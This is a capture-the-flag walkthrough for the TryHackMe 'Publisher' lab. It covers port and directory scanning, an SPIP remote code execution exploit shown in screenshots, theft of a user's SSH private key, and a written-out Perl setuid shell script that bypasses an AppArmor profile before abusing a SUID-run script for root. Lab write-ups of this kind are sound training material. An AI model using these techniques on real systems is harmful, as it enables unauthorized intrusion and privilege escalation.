---
tags:
  - thm
  - medium
title: Publisher
---


#### Author: **lomar**
![lomar](https://www.hackthebox.com/badge/image/1506415)

---

Configure `/etc/hosts`

```
$ sudo vim /etc/hosts  
# --Trim--  
10.10.125.178 publisher.thm
```

Nmap scan result:
```
# Nmap 7.94SVN scan initiated Fri Jun 28 15:29:25 2024 as: nmap -T4 -A -v -p- -Pn -oA nmap publisher.thm  
Nmap scan report for 10.10.198.190 (10.10.198.190)  
Host is up (0.083s latency).  
Not shown: 65533 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)  
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)  
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)  
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))  
|_http-title: Publisher's Pulse: SPIP Insights & Tips  
|_http-server-header: Apache/2.4.41 (Ubuntu)  
| http-methods:   
|_  Supported Methods: OPTIONS HEAD GET POST  
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).  
TCP/IP fingerprint:  
OS:SCAN(V=7.94SVN%E=4%D=6/28%OT=22%CT=1%CU=44776%PV=Y%DS=2%DC=T%G=Y%TM=667F  
OS:0F73%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10F%TI=Z%CI=Z%TS=A)OPS(O  
OS:1=M509ST11NW7%O2=M509ST11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509ST11N  
OS:W7%O6=M509ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R  
OS:=Y%DF=Y%T=40%W=F507%O=M509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%  
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y  
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R  
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=  
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S  
OS:)  
  
Uptime guess: 17.019 days (since Tue Jun 11 15:03:04 2024)  
Network Distance: 2 hops  
TCP Sequence Prediction: Difficulty=258 (Good luck!)  
IP ID Sequence Generation: All zeros  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
TRACEROUTE (using port 1723/tcp)  
HOP RTT      ADDRESS  
1   80.09 ms 10.14.0.1 (10.14.0.1)  
2   83.31 ms 10.10.198.190 (10.10.198.190)  
  
Read data files from: /usr/bin/../share/nmap  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done at Fri Jun 28 15:30:59 2024 -- 1 IP address (1 host up) scanned in 93.87 secondss
```
Gobuster directory scan result
```
$ gobuster dir --url http://publisher.thm/ --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -x php,bin,cgi,txt -o gobuster  
  
/.php                 (Status: 403) [Size: 278]  
/images               (Status: 301) [Size: 315] [--> http://10.10.198.190/images/]  
/spip                 (Status: 301) [Size: 313] [--> http://10.10.198.190/spip/]

`[http://publisher.thm/](http://publisher.thm/)`
```

![](https://miro.medium.com/v2/resize:fit:700/1*mSwSV7Q_dhfPY8GxIrh_wA.png)

`[http://publisher.thm/spip](http://publisher.thm/spip)`

![](https://miro.medium.com/v2/resize:fit:700/1*WP-mewQInPy5KgMa6naGvA.png)

Let’s do a simple search through Searchsploit.

![](https://miro.medium.com/v2/resize:fit:700/1*09FY4JNn1stZO9EGrXOl6g.png)

Exploit `51536` seems to be compatible with the version on our machine.

Before using the exploit, we need to check the URL used by the PoC, because it is not a standalone PoC. There is a line of code that tells us to go to `[http://publisher.thm/spip](http://publisher.thm/spip)?page=spip_pass`

![](https://miro.medium.com/v2/resize:fit:537/1*A6Alb8nRTDN2YcL_MkiwKg.png)

`[http://publisher.thm/spip?page=spip_pass](http://publisher.thm/spip?page=spip_pass)`

![](https://miro.medium.com/v2/resize:fit:700/1*CFIQ8oQkYi06gaaRjwYsgw.png)

Now we can try something using PoC, it gives us the PHP payload. We will use this when we do a more detailed analysis with Burpsuite.

![](https://miro.medium.com/v2/resize:fit:700/1*EujjqTk8ZHfKrMU7uz0SXg.png)

![](https://miro.medium.com/v2/resize:fit:700/1*2MYQ0gSG2fxQhMU-S_1GfA.png)

With a small search, we access the `/home/think/.ssh/id_rsa`file and log in to the system as the `think`user. We access the flag in the `/home/think/user.txt`

When we run `linpeas`on `/dev/shm` folder, it gives us a detailed report. Here we see that the `/usr/sbin/run_container` binary file has `SUID` perm, when we run this file, it turns out that it uses a bash script in the path `/opt/run_container.sh`. We have authorization to write to `/opt/run_container.sh`, but `AppArmor` is blocking it. Let’s look at this in more detail.

```
think@publisher:~$ cat /etc/apparmor.d/usr.sbin.ash  
  
#include <tunables/global>  
  
/usr/sbin/ash flags=(complain) {  
  #include <abstractions/base>  
  #include <abstractions/bash>  
  #include <abstractions/consoles>  
  #include <abstractions/nameservice>  
  #include <abstractions/user-tmp>  
  # Remove specific file path rules  
  # Deny access to certain directories  
  deny /opt/ r,  
  deny /opt/** w,  
  deny /tmp/** w,  
  deny /dev/shm w,  
  deny /var/tmp w,  
  deny /home/** w,  
  /usr/bin/** mrix,  
  /usr/sbin/** mrix,  
  # Simplified rule for accessing /home directory  
  owner /home/** rix,  
}
```

The AppArmor profile gets our write permission in the `/opt/` directory, let’s try to bypass it. With a little research we find a vulnerability that we can use. In this example it uses the `/tmp/` directory, but on our machine the permission to write to `/tmp/` is blocked by AppArmor, so we will overcome this by using the `/dev/shm` path. We also run `linpeas` here ;)

```
echo '#!/usr/bin/perl  
use POSIX qw(strftime);  
use POSIX qw(setuid);  
POSIX::setuid(0);  
exec "/bin/sh"' > /dev/shm/test.pl  
chmod +x /dev/shm/test.pl  
/dev/shm/test.pl
```

And we get a clean Shell, free of AppArmor, now we can edit `/opt/run_container.sh` as we want, then run `/usr/sbin/run_container` binary and use SUID privileges.